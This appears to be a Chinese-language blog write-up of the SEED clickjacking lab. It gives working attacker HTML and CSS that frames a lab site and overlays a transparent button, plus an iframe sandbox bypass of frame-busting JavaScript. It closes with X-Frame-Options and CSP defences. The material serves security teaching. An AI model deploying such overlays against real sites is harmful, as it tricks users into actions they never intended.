---
title: Web安全-点击劫持
date: 2026-04-21
categories: Web 安全
toc: true
---

点击劫持（Clickjacking）是一种经典的 UI 层面的 Web 攻击技术，本次实验完成真实攻击与防御的完整流程，展示点击劫持的实现原理、绕过方法以及最终的服务器端防护策略。

<!--more-->



点击劫持将受信任的网页嵌入到自己的恶意页面中，使用透明的恶意按钮覆盖正常按钮，触发的是攻击者预设的恶意操作。这种攻击不依赖脚本漏洞，而是利用浏览器的渲染特性实现视觉欺骗，具有极强的隐蔽性。



## 环境配置

[下载 Labsetup](https://seedsecuritylabs.org/Labs_20.04/Web/Web_Clickjacking_Cupcakes) 

启动 docker 环境

```bash
dcbuild
dcup
# 实验完关闭环境
dcdown
```



添加 hosts

```bash
sudo nano /etc/hosts
```

```
10.9.0.5 www.cjlab.com
10.9.0.105 www.cjlab-attacker.com
```

`www.cjlab.com` 是受信任的网站

`www.cjlab-attacker.com` 是攻击者的恶意网站



## 实验

### Task1-Copy that site

伪造一个与 cjlab.com 一样的网站 cjlab-attacker.com

cjlab.com：

![image-20260420232016907](../assets/img/Web%E5%AE%89%E5%85%A8-%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/1.png)

`<iframe>` 标签规定一个内联框架，使用 iframe 在恶意网站上嵌入 cjlab.com

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Attacker</title>
        <meta charset="utf-8"/>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6g>
        <link href="attacker.css" type="text/css" rel="stylesheet"/>
    </head>

    <body>
        <!-- TODO: place your iframe HERE (Task 1) -->
		<iframe src="http://www.cjlab.com" frameborder="0"></iframe>

        <!-- The malicious button's html code has already been provided for you. 
            Note that the button code must come after iframe code-->
        <button onclick="window.location.href = 'hacked.html';">Malicious Button</button>
    </body>

</html>
```

iframe  默认会显示边框和滚动条。

通过 CSS将 iframe 设置为全屏、无边框、绝对定位，使其与恶意页面背景完全融合，视觉上伪造出与原网站一模一样的界面。

frameborder = 0 设置无边框

CSS 设置：

```css
iframe {
    /* TODO: add iframe css here (Task 1) */
    position: absolute; /* 使用绝对定位 */
    width: 100%; /* 宽度占满 */
    height: 100%; /* 高度占满 */
    frameborder: 0; /* 设置无边框的方式 */
    z-index: 1; /* 设置堆叠顺序为1 */
}

button{
    /* Given button code for size and shape. You do not need to edit this. */
    position: absolute;
    border: none;
    color: white;
    padding: 35px 35px;
    text-align: center;
    font-size: 40px;
    border-radius: 15px;
    /* end of given button code */

    /* TODO: edit/add attributes below for the malicious button (Task 2) */
    /* You will want to change the button's position on the page and 
       make the button transparent */
    color: white;  /* font color */
    background-color: blue;  /* button's background color */
    z-index: 2;  /* 设置堆叠顺序为2，按钮可以覆盖在上面 */
  }
```

这时候就能看到伪造出的页面和 cjlab.com 一模一样，除了这个 Malicious 按钮作为后续攻击载体。

![image-20260420231935824](../assets/img/Web%E5%AE%89%E5%85%A8-%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/2.png)

### Task2-Let’s Get Clickjacking

实现视觉欺骗，调整按钮的样式与位置，与 Explore Nenu 按钮重合

margin-left: 50px margin-top: 350px 恰好重合

![image-20260420233721936](../assets/img/Web%E5%AE%89%E5%85%A8-%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/3.png)

color background-color 修改为 transparent 透明

![image-20260420233839416](../assets/img/Web%E5%AE%89%E5%85%A8-%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/4.png)

```css
button{
    /* Given button code for size and shape. You do not need to edit this. */
    position: absolute;
    border: none;
    color: white;
    padding: 35px 35px;
    text-align: center;
    font-size: 40px;
    border-radius: 15px;
    /* end of given button code */


    /* TODO: edit/add attributes below for the malicious button (Task 2) */
    /* You will want to change the button's position on the page and 
       make the button transparent */
    color: transparent;  /* font color */
    background-color: transparent;  /* button's background color */
    margin-left: 50px;
    margin-top: 350px;
    z-index: 2;
  }
```

现在模拟用户点击 Explore Menu，会发现跳转到 `http://www.cjlab-attacker.com/hacked.html` ，表示点击劫持成功。



### Task3-Bust That Frame

写 JS 代码，防框架嵌入，检查自身是否处于 iframe 嵌套中

- `window.top` 返回顶级浏览器窗口的引用

- `window` 返回当前窗口的引用

非嵌套页面这两个引用相同，在嵌套页面则不同。

```js
    <!-- Frame Busting script to prevent clickjacking -->
    <script>
        window.onload = function() {
            makeThisFrameOnTop();
        };

        function makeThisFrameOnTop() {
            // TODO: write a frame-busting function according to
            // instructions (Task 3)
            if(window.top !== window){
                window.top.location = window.location;
            } 
        } 

    </script>
```

在两个引用不同的情况下，将 `window.top.location`设置为 `window.location`。

这将强制顶级浏览器窗口（即攻击者的页面）的 URL 被改为防御者网页自身的 URL ，从而跳出 `iframe` 的嵌套，直接在浏览器中打开被嵌套的正确页面。

模拟用户，每点击这个恶意网站，会自动跳转到 cjlab.com ，点击劫持被成功阻断。





### Task4-Attacker Countermeasure

攻击者可以通过 `sandbox`  沙箱属性轻松绕过 JS 代码检查

`<iframe>` 标签的 `sandbox` 是 HTML5 引入的安全特性，会对内部加载的内容施加严格的限制，禁用脚本执行、表单提交等能力，创建受限的上下文，反而阻止了受害网站的 JS 检查。

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Attacker</title>
        <meta charset="utf-8"/>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
        <link href="attacker.css" type="text/css" rel="stylesheet"/>
    </head>
    
    <body>
        <!-- TODO: place your iframe HERE (Task 1) -->
		<iframe src="http://www.cjlab.com" frameborder="0" sandbox></iframe>

        <!-- The malicious button's html code has already been provided for you. 
            Note that the button code must come after iframe code-->
        <button onclick="window.location.href = 'hacked.html';">Malicious Button</button>
    </body>

</html>
```

现在再进行实验，又发生了点击劫持，这说明仅依赖前端 JavaScript 防御是不可靠的，攻击者总能找到绕过方式。



### Task5-The Ultimate Bust

恶意网站能先获取 cjlab.com 网页内容，再嵌入到页面内，此时 cjlab.com 的前端防御才能执行。而使用 sandbox 属性模拟正常网页，没办法解决点击劫持问题。

最可靠的防御必须在服务端实现，使用专门的响应头或 CSP 策略

- X-Frame-Options：`DENY/SAMEORIGN` ，DENY 不允许嵌入，SAMEORIGN 仅允许同源嵌入
- Content-Security-Policy：`frame-ancestors` 指定可以将页面嵌入框架的有效父级，设置为 none 不允许嵌入

在 `www.cjlab.com` 的 Apache 虚拟主机配置中添加：

```conf
<VirtualHost *:80>
    DocumentRoot /var/www/defender
    ServerName www.cjlab.com
#    Header set <Header-name> "<value>";
#    Header set Content-Security-Policy " \
#             <directive> '<value>'; \
#           "
    Header set X-Frame-Options "deny";
    Header set Content-Security-Policy " \
             frame-ancestors 'none'; \
           "
</VirtualHost>
```

重启服务后，再访问恶意网站，浏览器直接拒绝加载 iframe，显示错误，点击劫持彻底失效。

![image-20260421000906863](../assets/img/Web%E5%AE%89%E5%85%A8-%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/5.png)



## 总结

点击劫持的本质是利用 iframe 和 CSS 实现视觉欺骗，仅使用前端防护能被 `sandbox` 绕过，必须在服务端通过 `X-Frame-Options` 和 CSP 响应头限制。